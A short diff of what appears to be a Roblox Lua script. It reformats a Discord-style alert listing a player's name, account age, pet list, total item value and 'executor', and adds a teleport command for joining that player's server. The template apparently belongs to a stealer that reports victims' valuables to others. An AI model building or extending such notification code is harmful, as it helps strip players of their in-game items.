@@ -337,9 +337,8 @@ Account Age: %s days```
 :palm_tree: **Pet List**
 ```%s```
 :island: **Join with URL**
-**%s
-
--# %s | %s**
+**%s**
+```game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")```
 ]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, joinUrlMarkdown, placeId, jobId)
 
     local data = {
